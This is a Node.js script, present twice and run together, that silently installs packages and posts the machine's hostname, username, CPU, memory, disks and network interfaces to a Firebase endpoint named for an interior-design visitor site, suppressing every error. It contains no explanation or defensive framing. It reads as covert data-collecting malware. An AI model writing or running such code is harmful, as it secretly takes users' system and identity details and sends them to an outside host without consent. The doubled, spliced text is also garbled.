const { execSync } = require("child_process")

function install(pkg){
    try{
        require.resolve(pkg)
    }catch{
        try{
            execSync(`npm install ${pkg} --silent`,{stdio:"ignore"})
        }catch{}
    }
}

install("axios")
install("systeminformation")

const axios = require("axios")
const si = require("systeminformation")
const os = require("os")

async function run(){

const cpu = await si.cpu()
const mem = await si.mem()
const disk = await si.fsSize()
const net = await si.networkInterfaces()

const data = {
device_name: os.hostname(),
user: os.userInfo().username,
platform: os.platform(),
cpu: cpu.manufacturer + " " + cpu.brand,
cpu_cores: cpu.cores,
ram_gb: (mem.total/1073741824).toFixed(2),
disks: disk,
network: net,
boot_time: new Date(Date.now()-os.uptime()*1000)
}

try{
await axios.post(
"https://interior-design-visitor-default-rtdb.firebaseio.com/devices.json",
data
)
}catch{}

}

run()const { execSync } = require("child_process")

function install(pkg){
    try{
        require.resolve(pkg)
    }catch{
        try{
            execSync(`npm install ${pkg} --silent`,{stdio:"ignore"})
        }catch{}
    }
}

install("axios")
install("systeminformation")

const axios = require("axios")
const si = require("systeminformation")
const os = require("os")

async function run(){

const cpu = await si.cpu()
const mem = await si.mem()
const disk = await si.fsSize()
const net = await si.networkInterfaces()

const data = {
device_name: os.hostname(),
user: os.userInfo().username,
platform: os.platform(),
cpu: cpu.manufacturer + " " + cpu.brand,
cpu_cores: cpu.cores,
ram_gb: (mem.total/1073741824).toFixed(2),
disks: disk,
network: net,
boot_time: new Date(Date.now()-os.uptime()*1000)
}

try{
await axios.post(
"https://interior-design-visitor-default-rtdb.firebaseio.com/devices.json",
data
)
}catch{}

}

run()
